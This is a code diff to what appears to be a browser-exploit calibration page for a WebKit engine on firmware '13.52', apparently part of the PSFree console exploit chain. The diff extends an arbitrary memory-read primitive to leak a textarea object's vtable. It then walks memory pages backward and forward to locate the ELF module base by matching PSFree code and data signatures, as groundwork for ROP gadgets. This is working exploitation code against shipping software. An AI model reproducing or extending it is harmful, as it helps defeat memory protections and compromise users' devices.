@@ -10,6 +10,7 @@ let exploit = null;
 let carrierRef = null;
 let nativeFn = null;
 let vtablePtr = null;
+let vtableHit = null;
 let tableOff = null;
 let calibrated = null;
 let manualBase = null;
@@ -25,7 +26,9 @@ const ASSUMED_EXPM1 = parseInt(
     16
 );
 const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
-const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "2048", 10);
+/** WebKit maps can be ~40–50MB; 2048 pages (32MB) was too short on 13.52 */
+const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "12288", 10);
+const FIND_FWD_MAX_STEPS = parseInt(params.get("fwdmax") || "512", 10);
 /** 0 = run full vtable walk as fast as possible; yield to UI every N steps */
 const WALK_YIELD_EVERY = parseInt(params.get("walkyield") || "512", 10);
 const WALK_LOG_EVERY = parseInt(params.get("walklog") || "128", 10);
@@ -383,11 +386,63 @@ function captureNativeFn(p, off) {
 }
 
 function findBaseWalkAddr(fn, step) {
-    const fnNum = ptrNum(fn);
-    const page = fnNum & ~(CAL_ALIGN_STEP - 1);
-    const addrNum = page - step * CAL_ALIGN_STEP;
+    return walkPageFrom(fn, step, true);
+}
+
+function walkPageFrom(startPtr, step, backward) {
+    const page = ptrNum(startPtr) & ~(CAL_ALIGN_STEP - 1);
+    const addrNum = backward
+        ? page - step * CAL_ALIGN_STEP
+        : page + step * CAL_ALIGN_STEP;
     if (addrNum <= 0x100000) return null;
+    if (addrNum >= 0xffffffff000) return null;
     return ptrFromNum(addrNum);
+}
+
+function checkPsFreeTextMagic(p, base) {
+    const q0 = read8p(p, base);
+    const q1 = read8p(p, base.add32(8));
+    if (!q0 || !q1) return false;
+    return q0.low === 0xe5894855 && q0.hi === 0x56415741
+        && q1.low === 0x54415541 && q1.hi === 0x8d485053;
+}
+
+function checkPsFreeDataMagic(p, base) {
+    const q0 = read8p(p, base);
+    const q1 = read8p(p, base.add32(8));
+    if (!q0 || !q1) return false;
+    return q0.low === 0x20 && q0.hi === 0
+        && q1.low === 0x3c13f4bf && q1.hi === 0x2;
+}
+
+function classifyModulePage(p, base) {
+    const w0 = read4p(p, base);
+    if (w0 === ELF_MAGIC) return "elf";
+    if (checkPsFreeTextMagic(p, base)) return "text";
+    if (checkPsFreeDataMagic(p, base)) return "data";
+    return null;
+}
+
+function elfBaseNear(p, hitPage, maxBack) {
+    const start = ptrNum(hitPage) & ~(CAL_ALIGN_STEP - 1);
+    for (let i = 0; i <= maxBack; i++) {
+        const addrNum = start - i * CAL_ALIGN_STEP;
+        if (addrNum <= 0x100000) break;
+        const b = ptrFromNum(addrNum);
+        if (read4p(p, b) === ELF_MAGIC) return b;
+    }
+    return null;
+}
+
+function resolveModuleBase(p, page, kind) {
+    if (kind === "elf") return page;
+    const elf = elfBaseNear(p, page, 512);
+    if (elf) {
+        mark("ELF-REFINE", kind + " @ " + page + " -> elf @ " + elf);
+        return elf;
+    }
+    mark("WALK-WARN", kind + " @ " + page + " — no ELF within 512 pages back, using page");
+    return page;
 }
 
 function addrFromNumber(n) {
@@ -422,8 +477,8 @@ function captureTextareaVtable(p, carrier) {
     for (let ci = 0; ci < cells.length; ci++) {
         const path = cells[ci];
         mark("VTABLE-PATH", path.label + " cell=" + path.cell);
-        for (let io = 0; io < 3; io++) {
-            const implOff = [0x18, 0x10, 0x20][io];
+        for (let io = 0; io < 5; io++) {
+            const implOff = [0x18, 0x10, 0x20, 0x28, 0x8][io];
             const webcore = read8p(p, path.cell.add32(implOff));
             if (!webcore || webcore.hi === 0) continue;
             mark("VTABLE-TRY", "webcore+0x" + implOff.toString(16) + "=" + webcore);
@@ -432,10 +487,10 @@ function captureTextareaVtable(p, carrier) {
                 const vt = read8p(p, webcore.add32(vtOff));
                 if (!vt || vt.hi === 0) continue;
                 const entry0 = read4p(p, vt);
-                if (isBadRead(entry0)) continue;
+                if (!looksLikeNativeCode(entry0) && isBadRead(entry0)) continue;
                 mark("VTABLE-OK", path.label + " impl+0x" + implOff.toString(16)
                     + " vtable=" + vt + " entry0=" + fmtMagic(entry0));
-                return { vtable: vt, webcore, jsCell: path.cell, implOff, vtOff };
+                return { vtable: vt, webcore, jsCell: path.cell, implOff, vtOff, entry0: read8p(p, vt) };
             }
         }
     }
@@ -444,22 +499,95 @@ function captureTextareaVtable(p, carrier) {
     return null;
 }
 
-function ensureVtablePtr(p) {
-    if (vtablePtr) return vtablePtr;
-    vtablePtr = loadVtableOverride();
-    if (vtablePtr) {
-        mark("VTABLE-LOAD", "cached " + vtablePtr);
-        return vtablePtr;
+function collectWalkAnchors(p) {
+    const out = [];
+    const seen = new Set();
+    const add = (label, ptr) => {
+        if (!ptr || ptr.hi === 0) return;
+        const k = ptrNum(ptr);
+        if (seen.has(k)) return;
+        seen.add(k);
+        out.push({ label, ptr });
+    };
+
+    vtableHit = null;
+    vtablePtr = null;
+    const hit = captureTextareaVtable(p, carrierRef);
+    if (hit) {
+        vtableHit = hit;
+        vtablePtr = hit.vtable;
+        try { sessionStorage.setItem(SS_VTABLE_PTR, String(hit.vtable)); } catch (_) { }
+        add("vtable", hit.vtable);
+        if (hit.entry0 && hit.entry0.hi > 0)
+            add("vtable[0]", hit.entry0);
+        for (let i = 0; i < 6; i++) {
+            const ei = read8p(p, hit.vtable.add32(i * 8));
+            if (!ei || ei.hi === 0) continue;
+            const code = read4p(p, ei);
+            if (looksLikeNativeCode(code))
+                add("vtable[" + i + "]", ei);
+        }
     }
-    if (!carrierRef) {
-        mark("VTABLE-FAIL", "no carrier — re-run Start");
+
+    if (nativeFn) {
+        const code = read4p(p, nativeFn);
+        if (looksLikeNativeCode(code))
+            add("nativeFn", nativeFn);
+        else if (!isBadRead(code))
+            add("nativeFn-weak", nativeFn);
+    }
+
+    return out;
+}
+
+async function walkOneAnchor(p, anchor, label) {
+    let bad = 0;
+    let mapped = 0;
+    let lastMagic = null;
+
+    async function tryDir(backward, maxSteps, tag) {
+        for (let step = 0; step < maxSteps; step++) {
+            const base = walkPageFrom(anchor, step, backward);
+            if (!base) break;
+
+            const kind = classifyModulePage(p, base);
+            const w0 = read4p(p, base);
+            if (isBadRead(w0)) bad++;
+            else mapped++;
+            lastMagic = w0;
+
+            const n = step + 1;
+            if (n === 1 || n % WALK_LOG_EVERY === 0 || kind) {
+                mark("VTABLE-FIND", label + " " + tag + " " + n + "/" + maxSteps
+                    + " base=" + base + " got=" + fmtMagic(w0)
+                    + (kind ? " (" + kind + ")" : ""));
+            }
+            if (n % 64 === 0)
+                state(label + " " + tag + " " + n + "/" + maxSteps + "…", "warn");
+
+            if (kind) {
+                const resolved = resolveModuleBase(p, base, kind);
+                mark("MODULE-HIT", label + " " + tag + " kind=" + kind + " base=" + resolved);
+                return resolved;
+            }
+
+            if (WALK_YIELD_EVERY > 0 && n % WALK_YIELD_EVERY === 0)
+                await new Promise(r => setTimeout(r, 0));
+        }
         return null;
     }
-    const hit = captureTextareaVtable(p, carrierRef);
-    if (!hit) return null;
-    vtablePtr = hit.vtable;
-    try { sessionStorage.setItem(SS_VTABLE_PTR, String(vtablePtr)); } catch (_) { }
-    return vtablePtr;
+
+    mark("WALK-ANCHOR", label + " start=" + anchor);
+    let hit = await tryDir(true, FIND_BASE_MAX_STEPS, "back");
+    if (hit) return hit;
+    hit = await tryDir(false, FIND_FWD_MAX_STEPS, "fwd");
+    if (hit) return hit;
+
+    mark("WALK-MISS", label + " unmapped/bad=" + bad + " mapped=" + mapped
+        + " last=" + fmtMagic(lastMagic));
+    if (bad > mapped && mapped < 8)
+        mark("HINT", label + " mostly 0xcccccccc — anchor likely wrong, not WebKit");
+    return null;
 }
 
 function suggestedExpm1(fn, off) {
@@ -744,6 +872,7 @@ async function runStart() {
         installP(carrier, { promote: params.get("promote") === "1" });
         carrierRef = carrier;
         vtablePtr = null;
+        vtableHit = null;
         const p = window.p;
         if (!p) throw new Error("window.p missing");
 
@@ -949,48 +1078,42 @@ function runAssumeTest(fromStart) {
 
 async function walkVtableForBase() {
     const p = window.p;
-    const startPtr = ensureVtablePtr(p);
-    if (!startPtr) {
-        state("vtable leak failed", "bad");
+    if (!carrierRef) {
+        state("no carrier", "bad");
         return false;
     }
 
     try { sessionStorage.removeItem(SS_VTABLE_FIND_I); } catch (_) { }
 
-    mark("VTABLE-WALK", "auto walk from " + startPtr + " (max " + FIND_BASE_MAX_STEPS + " pages)");
-    state("vtable walk 0/" + FIND_BASE_MAX_STEPS + "…", "warn");
-
-    for (let step = 0; step < FIND_BASE_MAX_STEPS; step++) {
-        const base = findBaseWalkAddr(startPtr, step);
-        if (!base) {
-            mark("CAL-FAIL", "vtable walk past valid range @ step " + step);
-            state("vtable walk stopped", "bad");
-            return false;
-        }
-
-        const magic = read4p(p, base);
-        const n = step + 1;
-        if (n === 1 || n % WALK_LOG_EVERY === 0 || magic === ELF_MAGIC) {
-            mark("VTABLE-FIND", n + "/" + FIND_BASE_MAX_STEPS
-                + " base=" + base + " got=" + fmtMagic(magic));
-        }
-        if (n % 32 === 0 || n === 1)
-            state("vtable walk " + n + "/" + FIND_BASE_MAX_STEPS + "…", "warn");
-
-        if (magic === ELF_MAGIC) {
-            applyBaseFound(base, "vtable-walk");
-            mark("NEXT", "Verify step to confirm gadgets (base from vtable, not expm1)");
-            state("ELF found via vtable walk", "ok");
-            return true;
-        }
-
-        if (WALK_YIELD_EVERY > 0 && n % WALK_YIELD_EVERY === 0)
-            await new Promise(r => setTimeout(r, 0));
+    const anchors = collectWalkAnchors(p);
+    if (anchors.length === 0) {
+        mark("VTABLE-FAIL", "no walk anchors — textarea vtable and nativeFn both failed");
+        state("vtable leak failed", "bad");
+        return false;
     }
 
-    mark("CAL-FAIL", "vtable walk exhausted " + FIND_BASE_MAX_STEPS + " pages — no ELF");
-    mark("HINT", "check VTABLE-OK line — try ?backmax=4096 or ?vtable=0 and manual base");
-    state("vtable walk — no ELF", "bad");
+    const mb = Math.round(FIND_BASE_MAX_STEPS * CAL_ALIGN_STEP / (1024 * 1024));
+    mark("VTABLE-WALK", anchors.length + " anchor(s), back=" + FIND_BASE_MAX_STEPS
+        + " (~" + mb + "MB) fwd=" + FIND_FWD_MAX_STEPS);
+    for (let i = 0; i < anchors.length; i++)
+        mark("VTABLE-ANCHOR", anchors[i].label + "=" + anchors[i].ptr);
+
+    for (let ai = 0; ai < anchors.length; ai++) {
+        const a = anchors[ai];
+        state("walking " + a.label + "…", "warn");
+        const base = await walkOneAnchor(p, a.ptr, a.label);
+        if (base) {
+            applyBaseFound(base, "walk/" + a.label);
+            mark("NEXT", "Verify step to confirm gadgets");
+            state("base found via " + a.label, "ok");
+            return true;
+        }
+    }
+
+    mark("CAL-FAIL", "all " + anchors.length + " anchors missed — no ELF/text/data header");
+    mark("HINT", "check WALK-MISS lines; if all cccc, vtable path is wrong");
+    mark("HINT", "try ?backmax=16384 or index_rw.html to peek VTABLE-OK address");
+    state("module walk — no hit", "bad");
     return false;
 }
 
@@ -1045,9 +1168,18 @@ async function runFindBase() {
         try { sessionStorage.setItem(SS_FIND_BASE_I, String(step)); } catch (_) { }
 
         if (magic !== ELF_MAGIC) {
+            const kind = classifyModulePage(p, base);
+            if (kind) {
+                const resolved = resolveModuleBase(p, base, kind);
+                try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
+                applyBaseFound(resolved, "nativeFn-walk/" + kind);
+                mark("NEXT", "Verify step to confirm gadgets");
+                state("base found via nativeFn walk", "ok");
+                return;
+            }
             const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
             mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
-            mark("HINT", "0xcccccccc = wrong address — keep tapping Find base");
+            mark("HINT", "0xcccccccc = wrong address — try 2e vtable walk");
             state("find-base " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
             return;
         }
@@ -1386,7 +1518,7 @@ function init() {
 
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "2e vtable walk auto after Start (?vtable=0 to disable)");
+    mark("BOOT", "2e auto walk: PSFree ELF+text+data magic, backmax=" + FIND_BASE_MAX_STEPS);
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
